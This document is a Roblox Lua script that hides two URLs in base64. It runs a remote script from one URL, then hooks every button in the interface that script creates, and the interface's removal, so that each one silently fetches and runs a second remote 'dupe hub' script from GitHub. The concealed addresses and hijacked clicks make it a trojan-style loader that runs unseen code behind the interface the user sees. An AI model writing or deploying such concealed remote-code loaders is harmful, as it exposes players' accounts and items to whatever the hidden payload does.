local Players = game:GetService("Players")
local LP = Players.LocalPlayer
local PG = LP:WaitForChild("PlayerGui")

local function decode(b64)
    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    b64=b64:gsub("[^"..b.."=]","")
    return (b64:gsub(".",function(x)
        if x=="=" then return "" end
        local r,f="",(b:find(x)-1)
        for i=6,1,-1 do r=r..((f%2^i-f%2^(i-1))>0 and "1" or "0") end
        return r
    end):gsub("%d%d%d?%d?%d?%d?%d?%d?",function(x)
        if #x~=8 then return "" end
        local c=0
        for i=1,8 do c=c+((x:sub(i,i)=="1") and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

local s1 = decode("aHR0cHM6Ly9hcGkucnViaXMuYXBwL3YyL3NjcmFwL1FHclRLZUhNYkJkNEwzSTIvcmF3")
local s2 = decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NpbGVudHh2bi9TdGVhbEFCcmFpbm90RHVwZS9tYWluL0R1cGUtaHViLmx1YQ==")

local before = {}
for _, c in ipairs(PG:GetChildren()) do before[c] = true end
loadstring(game:HttpGet(s1))()

local newGui
local t0 = tick()
while not newGui and tick() - t0 < 20 do
    for _, g in ipairs(PG:GetChildren()) do
        if not before[g] then
            newGui = g
            break
        end
    end
    task.wait(0.1)
end

if newGui then
    for _, obj in ipairs(newGui:GetDescendants()) do
        if obj:IsA("TextButton") or obj:IsA("ImageButton") then
            obj.Activated:Connect(function()
                pcall(function()
                    loadstring(game:HttpGet(s2))()
                end)
            end)
        end
    end
    newGui.AncestryChanged:Connect(function(_, p)
        if not p then
            pcall(function()
                loadstring(game:HttpGet(s2))()
            end)
        end
    end)
end
